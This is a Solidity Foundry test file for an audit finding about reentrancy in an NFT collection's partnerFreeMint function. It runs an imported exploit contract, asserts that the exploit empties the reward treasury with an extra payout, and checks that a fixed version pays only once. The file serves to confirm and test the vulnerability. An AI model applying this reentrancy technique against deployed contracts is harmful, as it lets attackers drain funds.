// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import {
    Exploit,
    PartnerNFT,
    Reward,
    CollectionFixed
} from "./37689-reentrance-in-partnerfreemint-zokyo-none-heurist-markdown.sol";

contract FixedReceiver {
    CollectionFixed public collection;
    bool internal retried;

    constructor(CollectionFixed collection_) {
        collection = collection_;
    }

    function onERC721Received(address, address, uint256, bytes calldata) external {
        if (retried) return;
        retried = true;
        try collection.partnerFreeMint(address(this)) {} catch {}
    }

    function mint() external {
        collection.partnerFreeMint(address(this));
    }
}

contract Finding37689Test is Test {
    function test_exploit_reenters_before_last_minted_is_set() public {
        Exploit e = new Exploit();
        e.run();
        assertEq(e.nfts(), 2, "2 NFTs");
        assertEq(e.received(), 2 ether, "2 reward tokens");
        assertEq(e.received() - 1 ether, 1 ether, "1 extra");
        assertEq(e.reward().balanceOf(address(e.collection())), 0, "treasury empty");
    }

    function test_control_stamp_before_mint_pays_one() public {
        PartnerNFT partner = new PartnerNFT();
        Reward reward = new Reward();
        CollectionFixed collection = new CollectionFixed(partner, reward);
        reward.mint(address(collection), 2 ether);
        FixedReceiver receiver = new FixedReceiver(collection);
        partner.mint(address(receiver));
        receiver.mint();
        assertEq(reward.balanceOf(address(receiver)), 1 ether, "one payout");
        assertEq(reward.balanceOf(address(collection)), 1 ether, "second mint did not pay");
        assertEq(collection.ownerOf(2), address(0), "no second id");
    }
}
